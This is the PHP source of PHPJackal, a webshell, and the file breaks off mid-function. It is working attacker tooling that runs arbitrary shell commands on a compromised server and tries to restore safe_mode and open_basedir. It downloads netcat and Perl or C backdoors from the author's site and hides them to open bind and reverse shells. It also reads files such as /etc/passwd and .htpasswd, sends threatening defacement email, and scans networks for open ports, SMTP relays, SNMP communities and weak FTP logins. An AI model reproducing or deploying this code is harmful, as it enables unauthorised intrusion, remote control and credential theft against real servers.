<?php
#--Config--#
$login_password= ''; //Set password
#----------#
error_reporting(E_ALL);
set_time_limit(0);
ini_set("max_execution_time","0");
ini_set("memory_limit","9999M");
set_magic_quotes_runtime(0);
if(!isset($_SERVER))$_SERVER = &$HTTP_SERVER_VARS;
if(!isset($_POST))$_POST = &$HTTP_POST_VARS;
if(!isset($_GET))$_GET = &$HTTP_GET_VARS;
if(!isset($_COOKIE))$_COOKIE=$HTTP_COOKIE_VARS;
$_REQUEST = array_merge($_GET, $_POST);
if (get_magic_quotes_gpc()){
foreach ($_REQUEST as $key=>$value)
{
$_REQUEST[$key]=stripslashes($value);
}
}
function hlinK($str=""){
$myvars=array('workingdiR','urL','imagE','namE','filE','downloaD','seC','cP','mV','rN','deL');
$ret=$_SERVER['PHP_SELF']."?";
$new=explode("&",$str);
foreach ($_GET as $key => $v){
$add=1;
foreach($new as $m){
$el = explode("=", $m);
if ($el[0]==$key)$add=0;
}
if($add)if(!in_array($key,$myvars))$ret.=$key."=".$v."&";
}
$ret.=$str;
return $ret;
}
if(!empty($login_password)){
if(!empty($_REQUEST['fpassw'])){
if($_REQUEST['fpassw']==$login_password)setcookie('passw',md5($_REQUEST['fpassw']));
@header("Location: ".hlinK());
}
if(empty($_COOKIE['passw']) || $_COOKIE['passw']!=md5($login_password))die("<html><body><table><form method=post><tr><td>Password:</td><td><input type=hidden name=seC value=about><input type=password name=fpassw></td></tr><tr><td></td><td><input type=submit value=login></td></tr></form></table></body></html>");
}
if (!empty($_REQUEST['workingdiR'])) chdir($_REQUEST['workingdiR']);
function checkthisporT($ip,$port,$timeout,$type=0){
if(!$type){
$scan=@fsockopen($ip,$port,$n,$s,$timeout);
if($scan){fclose($scan);return 1;}
}
elseif(function_exists('socket_set_timeout')){
$scan=@fsockopen("udp://".$ip,$port);
if($scan){
socket_set_timeout($scan,$timeout);
@fwrite($scan,"\x00");
$s=time();
fread($scan,1);
if((time()-$s)>=$timeout){fclose($scan);return 1;}
}
}
return 0;
}
if (!function_exists("file_get_contents")){
function file_get_contents($addr){
$a = fopen($addr,"r");
$tmp = fread($a,filesize($a));
fclose($a);
if($a)return $tmp;
}
}
if (!function_exists("file_put_contents")){
function file_put_contents($addr,$con){
$a = fopen($addr,"w");
if(!$a)return 0;
fwrite($a,$con);
fclose($a);
return strlen($con);
}
}
function flusheR(){
flush();@ob_flush();
}
if (!empty($_REQUEST['downloaD'])){
@ob_clean();
$dl=$_REQUEST['downloaD'];
$con=file_get_contents($dl);
header("Content-type: application/octet-stream");
header("Content-disposition: attachment; filename=\"$dl\";");
header("Content-length: ".strlen($con));
echo $con;
exit;
}
if (!empty($_REQUEST['imagE'])){
$img=$_REQUEST['imagE'];
header("Content-type: imagE/gif");
header("Content-length: ".filesize($img));
header("Last-Modified: ".date("r",filemtime($img)));
echo file_get_contents($img);
exit;
}
@header("Cache-Control: no-cache, must-revalidate");
@header("Expires: Mon, 7 Aug 1987 05:00:00 GMT");
function showsizE($size){
if ($size>=1073741824)$size = round(($size/1073741824) ,2)." GB";
elseif ($size>=1048576)$size = round(($size/1048576),2)." MB";
elseif ($size>=1024)$size = round(($size/1024),2)." KB";
else $size .= " B";
return $size;
}
if (substr((strtoupper(php_unamE())),0,3)=="WIN") $windows=1; else $windows=0;
$errorbox = "<table border=0 cellpadding=0 cellspacing=0 style=\"border-collapse: collapse\" bordercolor=\"#282828\" bgcolor=\"#333333\" width=\"100%\"><tr><td><b>Error: </b>";
$et = "</td></tr></table>";
$v="1.5";
$msgbox="<br><table border=0 cellpadding=0 cellspacing=0 style=\"border-collapse: collapse\" bordercolor=\"#282828\" bgcolor=\"#333333\" width=\"100%\"><tr><td align=\"center\">";
$intro="<center><table border=0 style=\"border-collapse: collapse\" bordercolor=\"#282828\"><tr><td bgcolor=\"#666666\"><b>Script:</b><br>".str_repeat("-=-",25)."<br><b>Name:</b> PHPJackal<br><b>Version:</b> $v<br><br><b>Author:</b><br>".str_repeat("-=-",25)."<br><b>Name:</b> NetJackal<br><b>Country:</b> Iran<br><b>Website:</b> <a href=\"http://netjackal.by.ru\" target=\"_blank\">http://netjackal.by.ru</a><br><b>Email:</b> <a href=\"mailto:nima_501@yahoo.com?subject=PHPJackal\">nima_501@yahoo.com</a><br></font>$et</center>";
$footer="${msgbox}PHPJackal v$v - Powered By <a href=\"http://netjackal.by.ru\" target=\"_blank\">NetJackal</a>$et";
$hcwd="<input type=hidden name=workingdiR value=\"".getcwd()."\">";
$t = "<table border=0 style=\"border-collapse: collapse\" bordercolor=\"#282828\" width=\"40%\"><tr><td width=\"40%\" bgcolor=\"#333333\">";
$crack="</td><td bgcolor=\"#333333\"></td></tr><form method=\"POST\" name=form><tr><td width=\"20%\" bgcolor=\"#666666\">Dictionary:</td><td bgcolor=\"#666666\"><input type=text name=dictionary size=35></td></tr><tr><td width=\"20%\" bgcolor=\"#808080\">Dictionary type:</td><td bgcolor=\"#808080\"><input type=radio name=combo checked value=0 onClick=\"document.form.user.disabled = false;\" style=\"border-width:1px;background-color:#808080;\">Simple (P)<input type=radio value=1 name=combo onClick=\"document.form.user.disabled = true;\" style=\"border-width:1px;background-color:#808080;\">Combo (U:P)</td></tr><tr><td width=\"20%\" bgcolor=\"#666666\">Username:</td><td bgcolor=\"#666666\"><input type=text size=35 value=root name=user></td></tr><tr><td width=\"20%\" bgcolor=\"#808080\">Server:</td><td bgcolor=\"#808080\"><input type=text name=target value=localhost size=35></td></tr><tr><td width=\"20%\" bgcolor=\"#666666\"></td><td bgcolor=\"#666666\" align=right>$hcwd<input class=buttons type=submit value=Start></td></tr></form></table></center>";
function namE(){
$name='';
srand((double)microtime()*100000);
for ($i=0;$i<=rand(3,10);$i++){
$name.=chr(rand(97,122));
}
return $name;
}
function whereistmP(){
$uploadtmp=ini_get('upload_tmp_dir');
$envtmp=(getenv('TMP'))?getenv('TMP'):getenv('TEMP');
if(is_dir('/tmp') && is_writable('/tmp'))return '/tmp';
if(is_dir('/usr/tmp') && is_writable('/usr/tmp'))return '/usr/tmp';
if(is_dir('/var/tmp') && is_writable('/var/tmp'))return '/var/tmp';
if(is_dir($uploadtmp) && is_writable($uploadtmp))return $uploadtmp;
if(is_dir($envtmp) && is_writable($envtmp))return $envtmp;
return ".";
}
function shelL($command){
global $windows,$disablefunctions;
$exec = '';$output= '';
$dep[]=array('pipe','r');$dep[]=array('pipe','w');
if(is_callable('passthru') && !strstr($disablefunctions,'passthru')){ @ob_start();passthru($command);$exec=@ob_get_contents();@ob_clean();@ob_end_clean();}
elseif(is_callable('system') && !strstr($disablefunctions,'system')){$tmp = @ob_get_contents(); @ob_clean();system($command) ; $output = @ob_get_contents(); @ob_clean(); $exec= $tmp; }
elseif(is_callable('exec') && !strstr($disablefunctions,'exec')) {exec($command,$output);$output = join("\n",$output);$exec= $output;}
elseif(is_callable('shell_exec') && !strstr($disablefunctions,'shell_exec')){$exec= shell_exec($command);}
elseif(is_resource($output=popen($command,"r"))) {while(!feof($output)){$exec= fgets($output);}pclose($output);}
elseif(is_resource($res=proc_open($command,$dep,$pipes))){while(!feof($pipes[1])){$line = fgets($pipes[1]); $output.=$line;}$exec= $output;proc_close($res);}
elseif ($windows && is_object($ws = new COM("WScript.Shell"))){$dir=(isset($_SERVER["TEMP"]))?$_SERVER["TEMP"]:ini_get('upload_tmp_dir') ;$name = $_SERVER["TEMP"].namE();$ws->Run("cmd.exe /C $command >$name", 0, true);$exec = file_get_contents($name);unlink($name);}
return $exec;
}
function downloadiT($get,$put){
$fo=@strtolower(ini_get('allow_url_fopen'));
if($fo || $fo=='on')$con=file_get_contents($get);
else{
$u=parse_url($get);
$host=$u['host'];$file=(!empty($u['path']))?$u['path']:'/';
$url=fsockopen($host, 80, $en, $es, 12);
fputs($url, "GET $file HTTP/1.0\r\nAccept-Encoding: text\r\nHost: $host\r\nReferer: $host\r\nUser-Agent: Mozilla/5.0 (compatible; Konqueror/3.1; FreeBSD)\r\n\r\n");
$tmp=$con='';
while($tmp!="\r\n")$tmp=fgets($url);
while(!feof($url))$con.=fgets($url);
}
$mk=file_put_contents($put,$con);
if($mk)return 1;
return 0;
}
function smtplogiN($addr,$user,$pass,$timeout){
$sock=fsockopen($addr,25,$n,$s,$timeout);
if(!$sock)return -1;
fread($sock,1024);
fputs($sock,'ehlo '.namE()."\r\n");
$res=substr(fgets($sock,512),0,1);
if($res!='2')return 0;
fgets($sock,512);fgets($sock,512);fgets($sock,512);
fputs($sock,"AUTH LOGIN\r\n");
$res=substr(fgets($sock,512),0,3);
if($res!='334')return 0;
fputs($sock,base64_encode($user)."\r\n");
$res=substr(fgets($sock,512),0,3);
if($res!='334')return 0;
fputs($sock,base64_encode($pass)."\r\n");
$res=substr(fgets($sock,512),0,3);
if($res!='235')return 0;
return 1;
}
function checksmtP($host,$timeout){
$from=strtolower(namE())."@".strtolower(namE()).".com";
$sock=@fsockopen($host,25,$n,$s,$timeout);
if(!$sock)return -1;
$res=substr(fgets($sock,512),0,3);
if($res!='220')return 0;
fputs($sock,'HELO '.namE()."\r\n");
$res=substr(fgets($sock,512),0,3);
if($res!='250')return 0;
fputs($sock,"MAIL FROM: <$from>\r\n");
$res=substr(fgets($sock,512),0,3);
if($res!='250')return 0;
fputs($sock,"RCPT TO: <contact@persianblog.com>\r\n");
$res=substr(fgets($sock,512),0,3);
if($res!='250')return 0;
fputs($sock,"DATA\r\n");
$res=substr(fgets($sock,512),0,3);
if($res!='354')return 0;
fputs($sock,"From: ".namE()." ".namE()." <$from>\r\nSubject: ".namE()."\r\nMIME-Version: 1.0\r\nContent-Type: text/plain;\r\n\r\n".namE().namE().namE()."\r\n.\r\n");
$res=substr(fgets($sock,512),0,3);
if($res!='250')return 0;
return 1;
}
function check_urL($url,$method,$search,$timeout){
if(empty($search))$search='200';
$u=parse_url($url);
$method=strtoupper($method);
$host=$u['host'];$file=(!empty($u['path']))?$u['path']:'/';
$data=(!empty($u['query']))?$u['query']:'';
if(!empty($data))$data="?$data";
$sock=@fsockopen($host,80,$en,$es,$timeout);
if($sock){
fputs($sock,"$method $file$data HTTP/1.0\r\n");
fputs($sock,"Host: $host\r\n");
if($method=='GET')fputs($sock,"\r\n");
elseif($method='POST')fputs($sock,"Content-Type: application/x-www-form-urlencoded\r\nContent-length: ".strlen($data)."\r\nAccept-Encoding: text\r\nConnection: close\r\n\r\n$data");
else return 0;
if($search=='200')if(substr(fgets($sock),0,3)=="200"){fclose($sock);return 1;}else {fclose($sock);return 0;}
while(!feof($sock)){
$res=trim(fgets($sock));
if(!empty($res))if(strstr($res,$search)){fclose($sock);return 1;}
}
fclose($sock);
}
return 0;
}
function get_sw_namE($host,$timeout){
$sock=@fsockopen($host,80,$en,$es,$timeout);
if($sock){
$page=namE().namE();
fputs($sock,"GET /$page HTTP/1.0\r\n\r\n");
while(!feof($sock)){
$con=fgets($sock);
if(strstr($con,'Server:')){$ser=substr($con,strpos($con,' ')+1);return $ser;}
}
fclose($sock);
return -1;
}return 0;
}
function snmpchecK($ip,$com,$timeout){
$res=0;
$n=chr(0x00);
$packet=chr(0x30).chr(0x26).chr(0x02).chr(0x01). chr(0x00). chr(0x04). chr(strlen($com)). 
$com. chr(0xA0). 
chr(0x19). chr(0x02). chr(0x01). chr(0x01). chr(0x02). chr(0x01). $n.
chr(0x02). chr(0x01). $n. chr(0x30). chr(0x0E). chr(0x30). chr(0x0C).
chr(0x06). chr(0x08). chr(0x2B). chr(0x06). chr(0x01). chr(0x02). chr(0x01).
chr(0x01). chr(0x01). $n. chr(0x05). $n;
$sock=@fsockopen("udp://$ip",161);
socket_set_timeout($sock,$timeout);
@fputs($sock,$packet);
socket_set_timeout($sock,$timeout);
$res=fgets($sock);
fclose($sock);
return $res;
}

$safemode=(@ini_get('safe_mode') or strtolower(@ini_get('safe_mode')) == 'on')?'ON':'OFF';
if($safemode=="ON"){@ini_restore("safe_mode");@ini_restore("open_basedir");}
$disablefunctions = @ini_get('disable_functions');
if (!function_exists("str_repeat")){
function str_repeat($str,$c){
$r="";
for($i=0; $i < $cu; $i++)$r.=$str;
return $r;
}
}

function brshelL(){
global $errorbox, $windows,$et,$hcwd;
$_REQUEST['C']=(isset($_REQUEST['C']))?$_REQUEST['C']:0;
$addr='http://netjackal.by.ru/backdoor';
$error="$errorbox Can not make backdoor file, go to writeable folder.$et";
$n=namE();
if(!$windows)$n=".$n";
$d=whereistmP();
$name=$d.DIRECTORY_SEPARATOR.$n;
$perl=(!$windows && shelL('which perl'))?$perl=shelL('which perl'):'perl';
$c=($_REQUEST['C'])?1:0;
if (!empty($_REQUEST['port']) && ($_REQUEST['port']<=65535) && ($_REQUEST['port']>=1) ){
$port=(int)$_REQUEST['port'];
if($windows){
if($c){
$name.=".exe";
$bd=downloadiT("$addr/nc.exe",$name);
shelL("attrib +H $name");
if(!$bd)echo $error;else shelL("$name -L -p $port -e cmd.exe");
}else{
$name = $name.".pl";
$bd=downloadiT("$addr/winbind.pl",$name);
shelL("attrib +H $name");
if(!$bd)echo $error;else shelL("perl.exe $name $port");
}
}
else{
if($c){
$bd=downloadiT("$addr/bind.c",$name);
if (!$bd) echo $error;else shelL("cd $d;gcc -o $n $n.c;chmod +x ./$n;./$n $port &");
}else{
$bd=downloadiT("$addr/bind.pl",$name);
if (!$bd)echo $error; else shelL("cd $d;$perl $n $port &");
echo "<font color=blue>Backdoor is waiting for you on $port.<br></font>";
}
}
}
elseif(!empty($_REQUEST['rport']) && ($_REQUEST['rport']<=65535) && ($_REQUEST['rport']>=1) && !empty($_REQUEST['ip'])){
$ip=$_REQUEST['ip'];
$port=(int)$_REQUEST['rport'];
if($windows){
if($c){
$name.='.exe';
$bd=downloadiT("$addr/nc.exe",$name);
shelL("attrib +H $name");
if(!$bd)echo $error;else shelL("$name $ip $port -e cmd.exe");
}else{
$name = $name.".pl";
$bd=downloadiT("$addr/winrc.pl",$name);
shelL("attrib +H $name");
if (!$bd)echo $error; else shelL("perl.exe $name $ip $port");
}
}
else{
if($c){
$bd=downloadiT("$addr/rc.c",$name);
if(!$bd) echo $error;else shelL("cd $d;gcc -o $n $n.c;chmod +x ./$n;./$n $ip $port &");
}else{
$bd=downloadiT("$addr/rc.pl",$name);
if(!$bd)echo $error;else shelL("cd $d;$perl $n $ip $port &");
}
}
echo "<font color=blue>Done!</font>";}
else{echo "<table border=0 style=\"border-collapse: collapse\" bordercolor=\"#282828\" width=\"100%\"><tr><td><table border=0 style=\"border-collapse: collapse\" bordercolor=\"#282828\" width=\"50%\"><tr><td width=\"50%\" bgcolor=\"#333333\">Bind shelL:</td><td bgcolor=\"#333333\"></td></tr><form method=\"POST\"><tr><td width=\"20%\" bgcolor=\"#666666\">Port:</td><td bgcolor=\"#666666\"><input type=text name=port value=55501 size=5></td></tr><tr><td width=\"20%\" bgcolor=\"#808080\">Type:</td><td bgcolor=\"#808080\"><input type=radio style=\"border-width:1px;background-color:#808080;\" value=0 checked name=C>PERL<input type=radio style=\"border-width:1px;background-color:#808080;\" name=C value=1>"; if($windows)echo "EXE"; else echo "C";echo"</td></tr><tr><td width=\"20%\" bgcolor=\"#666666\"></td><td bgcolor=\"#666666\" align=right>$hcwd<input type=submit class=buttons value=Bind></td></tr></form></table></td><td><table border=0 style=\"border-collapse: collapse\" bordercolor=\"#282828\" width=\"50%\"><tr><td width=\"40%\" bgcolor=\"#333333\">Reverse shelL:</td><td bgcolor=\"#333333\"></td></tr><form method=\"POST\"><tr><td width=\"20%\" bgcolor=\"#808080\">IP:</td><td bgcolor=\"#808080\"><input type=text name=ip value=";echo $_SERVER["REMOTE_ADDR"]; echo " size=17></td></tr><tr><td width=\"20%\" bgcolor=\"#666666\">Port:</td><td bgcolor=\"#666666\"><input type=text name=rport value=53 size=5></td></tr><tr><td width=\"20%\" bgcolor=\"#808080\">Type:</td><td bgcolor=\"#808080\"><input type=radio style=\"border-width:1px;background-color:#808080;\" value=0 checked name=C>PERL<input type=radio style=\"border-width:1px;background-color:#808080;\" name=C value=1>"; if($windows)echo "EXE"; else echo "C";echo"</td></tr><tr><td width=\"20%\" bgcolor=\"#666666\"></td><td bgcolor=\"#666666\" align=right>$hcwd<input class=buttons type=submit value=Connect></td></tr></form></table>$et";}}
function showimagE($img){
echo "<center><img border=0 src=\"".hlinK("imagE=$img&&workingdiR=".getcwd())."\"></center>";}
function editoR($file){
global $errorbox,$et,$hcwd;
if (is_file($file)){
if (!is_readable($file)){echo "$errorbox File is not readable$et<br>";}
if (!is_writeable($file)){echo "$errorbox File is not writeable$et<br>";}
$data = file_get_contents($file);
echo "<center><table border=0 style=\"border-collapse: collapse\" bordercolor=\"#282828\" width=\"40%\"><tr><td width=\"10%\" bgcolor=\"#808080\"><form method=\"POST\">$hcwd<input type=text value=\"".htmlspecialchars($file)."\" size=75 name=file><input type=submit class=buttons name=Open value=Open></td></tr></form></table><br><table border=0 style=\"border-collapse: collapse\" bordercolor=\"#282828\" width=\"40%\"><tr><td width=\"40%\" bgcolor=\"#666666\"><form method=\"POST\"><textarea rows=\"18\" name=\"edited\" cols=\"64\">";
echo htmlspecialchars($data);
echo "</textarea></td></tr><tr><td width=\"10%\" bgcolor=\"#808080\"><input type=text value=\"$file\" size=80 name=file></td></tr><td width=\"40%\" bgcolor=\"#666666\" align=\"right\">";
}
else {echo "<center><table border=0 style=\"border-collapse: collapse\" bordercolor=\"#282828\" width=\"40%\"><tr><td width=\"10%\" bgcolor=\"#808080\"><form method=\"POST\"><input type=text value=\"".getcwd()."\" size=75 name=file>$hcwd<input type=submit class=buttons name=Open value=Open></td></tr></form></table><br><table border=0 style=\"border-collapse: collapse\" bordercolor=\"#282828\" width=\"40%\"><tr><td width=\"40%\" bgcolor=\"#666666\"><form method=\"POST\"><textarea rows=\"18\" name=\"edited\" cols=\"63\"></textarea></td></tr><tr><td width=\"10%\" bgcolor=\"#808080\"><input type=text value=\"".getcwd()."\" size=80 name=file></td></tr><td width=\"40%\" bgcolor=\"#666666\" align=\"right\">";
}
echo "$hcwd<input type=submit class=buttons name=Save value=Save></td></form></tr></table></center>";
}
function webshelL(){
global $windows,$hcwd;
if($windows){
$alias="<option value=\"netstat -an\">Display open ports</option><option value=\"tasklist\">List of processes</option><option value=\"systeminfo\">System information</option><option value=\"ipconfig /all\">IP configuration</option><option value=\"getmac\">Get MAC address</option><option value=\"net start\">Services list</option><option value=\"net view\">Machines in domain</option><option value=\"net user\">Users list</option><option value=\"gpresult\">Group policy</option><option value=\"shutdown -s -f -t 1\">Turn off the server</option>";
}
else{
$alias="<option value=\"netstat -an | grep -i listen\">Display open ports</option><option value=\"last -a -n 250 -i\">Show last 250 logged in users</option><option value=\"which wget curl lynx w3m\">Downloaders</option><option value=\"find / -perm -2 -type d -print\">Find world-writable directories</option><option value=\"find . -perm -2 -type d -print\">Find world-writable directories(in current directory)</option><option value=\"find / -perm -2 -type f -print\">Find world-writable files</option><option value=\"find . -perm -2 -type f -print\">Find world-writable files(in current directory)</option><option value=\"find / -type f -perm 04000 -ls\">Find files with SUID bit set</option><option value=\"find / -type f -perm 02000 -ls\">Find files with SGID bit set</option><option value=\"find / -name .htpasswd -type f\">Find .htpasswd files</option><option value=\"find / -type f -name .bash_history\">Find .bash_history files</option><option value=\"cat /etc/syslog.conf\">View syslog.conf</option><option value=\"cat cat /etc/hosts\">View hosts</option><option value=\"ps auxw\">List of processes</option>";
if(is_dir('/etc/valiases'))$alias.="<option value=\"ls -l /etc/valiases\">List of Cpanel`s domains(valiases)</option>";if(is_dir('/etc/vdomainaliases'))$alias.="<option value=\"ls -l /etc/vdomainaliases\">List Cpanel`s domains(vdomainaliases)</option>";if(file_exists('/var/cpanel/accounting.log'))$alias.="<option value=\"cat /var/cpanel/accounting.log\">Display Cpanel`s log</option>";
if(is_dir('/var/spool/mail/'))$alias.="<option value=\"ls /var/spool/mail/\">Mailboxes list</option>";
}
echo "<center><table border=0 cellpadding=0 cellspacing=0 style=\"border-collapse: collapse\" bordercolor=\"#282828\" bgcolor=\"#333333\" width=\"65%\"><form method=\"POST\"><tr><td width=\"20%\"><b>Location:</b><input type=text name=workingdiR size=82 value=\"".getcwd()."\"><input class=buttons type=submit value=Change></td></tr></form></table><br><table border=0 cellpadding=0 cellspacing=0 style=\"border-collapse: collapse\" bordercolor=\"#282828\" bgcolor=\"#333333\" width=\"65%\"><tr><td><b>Web Shell:</b></td></tr><td bgcolor=\"#666666\"><textarea rows=\"22\" cols=\"78\">";
if (!empty($_REQUEST['cmd'])) echo shelL($_REQUEST['cmd']);
echo"</textarea></td></tr><form method=post><tr><td bgcolor=\"#808080\"><input type=text size=91 name=cmd value=\"";if (!empty($_REQUEST['cmd'])) echo htmlspecialchars(($_REQUEST['cmd']));elseif(!$windows) echo "cat /etc/passwd";echo "\">$hcwd<input class=buttons type=submit value=Execute></td></tr></form></td></tr><form method=post><tr><td bgcolor=\"#808080\"><select name=\"cmd\" width=70>$alias</select>$hcwd<input class=buttons type=submit value=Execute></td></tr></form></table></table><center>";
}
function maileR(){
global $msgbox,$et,$hcwd;
$cwd= getcwd();
if (!empty($_REQUEST['subject'])&&!empty($_REQUEST['body'])&&!empty($_REQUEST['from'])&&!empty($_REQUEST['to'])){
$to=$_REQUEST['to'];$from=$_REQUEST['from'];$subject=$_REQUEST['subject'];$body=$_REQUEST['body'];
if (!mail($to,$subject,$body,"From: $from"))break;
echo "$msgbox<b>Mail sent!</b><br>$et";
}
echo "<center><br><table border=0 cellpadding=0 cellspacing=0 style=\"border-collapse: collapse\" bordercolor=\"#282828\" bgcolor=\"#333333\" width=\"50%\"><tr><form method=\"POST\"><td><b>Mailer:</b></td></tr><td width=\"20%\" bgcolor=\"#666666\">SMTP</td><td bgcolor=\"#666666\">".ini_get('SMTP')." (".ini_get('smtp_port').")</td></tr><tr><td bgcolor=\"#808080\">From:</td><td bgcolor=\"#808080\"><input name=from type=text value=\"evil@hell.gov\" size=55>$hcwd</td><tr><td width=\"25%\" bgcolor=\"#666666\">To:</td><td bgcolor=\"#666666\"><input name=to type=text value=\""; if (!empty($_REQUEST['to'])) echo htmlspecialchars($_REQUEST['to']); elseif(!empty($_ENV["SERVER_ADMIN"])) echo $_ENV["SERVER_ADMIN"];else echo "admin@".getenv('HTTP_HOST'); echo "\" size=55></td></tr><tr><td bgcolor=\"#808080\">Subject:</td><td bgcolor=\"#808080\"><input name=subject type=text value=\"YOUR SERVER HAS BEED HACKED :-P\" size=55></td><tr><td bgcolor=\"#666666\">Body:</td><td bgcolor=\"#666666\"><textarea rows=\"18\" cols=\"43\" name=body>Admin, your system has been hacked! if you don`t seCure it, next time i`ll format your box.</textarea></td></tr><tr><td width=\"10%\" bgcolor=\"#808080\"></td><td bgcolor=\"#808080\" align=\"right\"><input type=submit class=buttons value=Send></form>$et";
}
function scanneR(){
global $hcwd;
if (!empty($_SERVER["SERVER_ADDR"])) $host=$_SERVER["SERVER_ADDR"];else $host ="127.0.0.1";
$udp=(empty($_REQUEST['udp']))?0:1;$tcp=(empty($_REQUEST['tcp']))?0:1;
if (($udp||$tcp) && !empty($_REQUEST['target']) && !empty($_REQUEST['fromport']) && !empty($_REQUEST['toport']) && !empty($_REQUEST['timeout']) && !empty($_REQUEST['portscanner'])){
$target=$_REQUEST['target'];$from=(int) $_REQUEST['fromport'];$to=(int)$_REQUEST['toport'];$timeout=(int)$_REQUEST['timeout'];$nu = 0;
echo "<font color=blue>Port scanning started against ".htmlspecialchars($target).":<br>";
$start=time();
for($i=$from;$i<=$to;$i++){
if($tcp){
if (checkthisporT($target,$i,$timeout)){
$nu++;
$ser="";
if(getservbyport($i,"tcp"))$ser="(".getservbyport($i,"tcp").")";
echo "$nu) $i $ser (<a href=\"telnet://$target:$i\">Connect</a>) [TCP]<br>";
}
}
if($udp)if(checkthisporT($target,$i,$timeout,1)){$nu++;$ser="";if(getservbyport($i,"udp"))$ser="(".getservbyport($i,"udp").")";echo "$nu) $i $ser [UDP]<br>";}
flusheR();
}
$time=time()-$start;
echo "Done! ($time seconds)</font>";
}
elseif (!empty($_REQUEST['securityscanner'])){
echo "<font color=blue>";
$start=time();
$from=$_REQUEST['from'];
$to=(int)$_REQUEST['to'];
$timeout=(int)$_REQUEST['timeout'];
$f = substr($from,strrpos($from,".")+1);
$from = substr($from,0,strrpos($from,"."));
if(!empty($_REQUEST['httpscanner'])){
echo "Loading webserver bug list...";
flusheR();
$buglist=whereistmP().DIRECTORY_SEPARATOR.namE();
$dl=@downloadiT('http://www.cirt.net/nikto/UPDATES/1.36/scan_database.db',$buglist);
if($dl){$file=file($buglist);echo "Done! scanning started.<br><br>";}else echo "Failed!!! scanning started without webserver security testing...<br><br>";
flusheR();
}else {$fr=htmlspecialchars($from); echo "Scanning $fr.$f-$fr.$to:<br><br>";}
for($i=$f;$i<=$to;$i++){
$output=0;
$ip="$from.$i";
if(!empty($_REQUEST['nslookup'])){
$hn=gethostbyaddr($ip);
if($hn!=$ip)echo "$ip [$hn]<br>";}
flusheR();
if(!empty($_REQUEST['ipscanner'])){
$port=$_REQUEST['port'];
if(strstr($port,","))$p=explode(",",$port);else $p[0]=$port;
$open=$ser="";
foreach($p as $po){
$scan=checkthisporT($ip,$po,$timeout);
if ($scan){
$ser="";
if($ser=getservbyport($po,"tcp"))$ser="($ser)";
$open.=" $po$ser ";
}
}
if($open){echo "$ip) Open ports:$open<br>";$output=1;}
flusheR();
}
if(!empty($_REQUEST['httpbanner'])){
$res=get_sw_namE($ip,$timeout);
if($res){
echo "$ip) Webserver software: ";
if($res==-1)echo "Unknow";
else echo $res;
echo "<br>";
$output=1;
}
flusheR();
}
if(!empty($_REQUEST['httpscanner'])){
if(checkthisporT($ip,80,$timeout) && !empty($file)){
$admin=array('/admin/','/adm/');
$users=array('adm','bin','daemon','ftp','guest','listen','lp','mysql','noaccess','nobody','nobody4','nuucp','operator','root','smmsp','smtp','sshd','sys','test','unknown','uucp','web','www');
$nuke=array('/','/postnuke/','/postnuke/html/','/modules/','/phpBB/','/forum/');
$cgi=array('/cgi.cgi/','/webcgi/','/cgi-914/','/cgi-915/','/bin/','/cgi/','/mpcgi/','/cgi-bin/','/ows-bin/','/cgi-sys/','/cgi-local/','/htbin/','/cgibin/','/cgis/','/scripts/','/cgi-win/','/fcgi-bin/','/cgi-exe/','/cgi-home/','/cgi-perl/');
foreach ($file as $v){
$vuln=array();
$v=trim($v);
if(!$v || $v{0}=='#')continue;
$v=str_replace('","','^',$v);
$v=str_replace('"','',$v);
$vuln=explode('^',$v);
$page=$cqich=$nukech=$adminch=$userch=$vuln[1];
if(strstr($page,'@CGIDIRS'))
foreach($cgi as $cg){
$cqich=str_replace('@CGIDIRS',$cg,$page);
$url="http://$ip$cqich";
$res=check_urL($url,$vuln[3],$vuln[2],$timeout);
if($res){$output=1;echo "$ip)".$vuln[4]." <a href=\"$url\" target=\"_blank\">$url</a><br>";}
flusheR();
}
elseif(strstr($page,'@ADMINDIRS'))
foreach ($admin as $cg){
$adminch=str_replace('@ADMINDIRS',$cg,$page);
$url="http://$ip$adminch";
$res=check_urL($url,$vuln[3],$vuln[2],$timeout);
if($res){$output=1;echo "$ip)".$vuln[4]." <a href=\"$url\" target=\"_blank\">$url</a><br>";}
flusheR();
}
elseif(strstr($page,'@USERS'))
foreach ($users as $cg){
$userch=str_replace('@USERS',$cg,$page);
$url="http://$ip$userch";
$res=check_urL($url,$vuln[3],$vuln[2],$timeout);
if($res){$output=1;echo "$ip)".$vuln[4]." <a href=\"$url\" target=\"_blank\">$url</a><br>";}
flusheR();
}
elseif(strstr($page,'@NUKE'))
foreach ($nuke as $cg){
$nukech=str_replace('@NUKE',$cg,$page);
$url="http://$ip$nukech";
$res=check_urL($url,$vuln[3],$vuln[2],$timeout);
if($res){$output=1;echo "$ip)".$vuln[4]." <a href=\"$url\" target=\"_blank\">$url</a><br>";}
flusheR();
}
else{
$url="http://$ip$page";
$res=check_urL($url,$vuln[3],$vuln[2],$timeout);
if($res){$output=1;echo "$ip)".$vuln[4]." <a href=\"$url\" target=\"_blank\">$url</a><br>";}
flusheR();
}
}
}
}
if(!empty($_REQUEST['smtprelay'])){
if(checkthisporT($ip,25,$timeout)){
$res='';
$res=checksmtP($ip,$timeout);
if($res==1){echo "$ip) SMTP relay found.<br>";$output=1;}flusheR();
}
}
if(!empty($_REQUEST['snmpscanner'])){
if(checkthisporT($ip,161,$timeout,1)){
$com=$_REQUEST['com'];
$coms=$res="";
if(strstr($com,","))$c=explode(",",$com);else $c[0]=$com;
foreach ($c as $v){
$ret=snmpchecK($ip,$v,$timeout);
if($ret)$coms .=" $v ";
}
if ($coms!=""){echo "$ip) SNMP FOUND: $coms<br>";$output=1;}
flusheR();
}
}
if(!empty($_REQUEST['ftpscanner'])){
if(checkthisporT($ip,21,$timeout)){
$usps=explode(',',$_REQUEST['userpass']);
foreach ($usps as $v){
$user=substr($v,0,strpos($v,':'));
$pass=substr($v,strpos($v,':')+1);
if($pass=='[BLANK]')$pass='';
$ftp=@ftp_connect($ip,21,$timeout);
if ($ftp){
if(@ftp_login($ftp,$user,$pass)){$output=1;echo "$ip) FTP FOUND: ($user:$pass) <a href=\"ftp://$ip\" target=\"_blank\">$ip</a> System type: ".ftp_systype($ftp)."<br>";}
}
flusheR();
}
}
}
if($output)echo "<hr size=1 noshade>";
flusheR();
}
$time=time()-$start;
echo "Done! ($time seconds)</font>";
if(!empty($buglist))unlink($buglist);
}
else{
$chbox=(extension_loaded('sockets'))?"<input type=checkbox name=tcp value=1 checked>TCP<input type=checkbox name=udp value=1 checked>UDP":"<input type=hidden name=tcp value=1>";
